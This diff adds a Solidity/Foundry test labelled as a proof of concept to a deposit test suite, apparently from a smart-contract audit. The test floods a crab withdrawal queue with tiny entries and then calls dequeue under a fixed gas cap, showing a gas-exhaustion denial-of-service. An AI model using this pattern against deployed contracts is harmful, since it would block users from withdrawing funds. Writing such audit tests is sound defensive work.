@@ -142,4 +142,16 @@ contract DepositTest is BaseForkSetup {
             netting.withdrawUSDC{gas: 200_000}(10e6);
         }
     }
+
+    function testWithdrawAndDeQueueFail_POC() public {
+        netting.setMinCrab(1);
+        vm.startPrank(withdrawer);
+        crab.approve(address(netting), 20e18);
+        netting.queueCrabForWithdrawal(10e18);
+
+        for (uint256 i = 0; i < 100; i++) {
+            netting.queueCrabForWithdrawal(10);
+            netting.dequeueCrab{gas: 200_000}(10);
+        }
+    }
 }
